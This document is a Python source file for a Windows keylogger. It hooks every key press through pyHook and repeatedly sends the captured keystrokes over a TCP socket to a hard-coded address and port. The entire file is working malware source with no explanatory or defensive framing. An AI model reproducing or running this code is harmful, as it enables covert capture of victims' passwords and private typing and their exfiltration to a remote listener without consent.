from socket import *
import win32console
import threading
import pythoncom
import win32api
import win32gui
import pyHook
import time
import os

# variable declartion
global pressed_keys
pressed_keys = []

# network stuff
def socket_connection(s):
	while 1:
		s.send("".join(pressed_keys))
		time.sleep(2)

	s.close()

# iniatiate sockets
s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.1.155", 6464))

# start network loop
socket_thread = threading.Thread(target=socket_connection, args=(s,))
socket_thread.start()

# key logging stuff
def OnKeyBoardEvent(event):
	pressed_keys.append(chr(event.Ascii))

# start listing for key presses ---
# create a hook manager object
hm=pyHook.HookManager()
hm.KeyDown=OnKeyBoardEvent

# set the hook
hm.HookKeyboard()

# wait forever
pythoncom.PumpMessages()